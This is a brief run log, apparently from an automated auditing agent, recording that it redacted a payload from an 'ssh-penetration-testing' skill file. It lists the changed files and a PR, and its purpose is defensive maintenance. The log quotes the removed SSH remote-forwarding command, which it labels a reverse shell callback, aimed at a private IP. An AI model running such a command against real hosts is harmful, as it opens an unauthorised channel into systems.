# Run Log: malicious-skill-safety-auditor - ssh-penetration-testing

## Selected skill
`skills/ssh-penetration-testing`

## Risk evidence reviewed
The file `skills/ssh-penetration-testing/SKILL.md` contained an active reverse shell payload (`ssh -R 4444:localhost:4444 user@192.168.1.100`) under the "Reverse shell callback" section. As a malicious-skill-safety-auditor, this active payload must be redacted using a safe placeholder while keeping the educational context intact.

## Files changed
- `skills/ssh-penetration-testing/SKILL.md`
- `data/maintenance/ledger.json`

## Linked PR/issue
PR-ssh-pentest-hardening

## Next action
Monitor for re-introduction of active payloads.
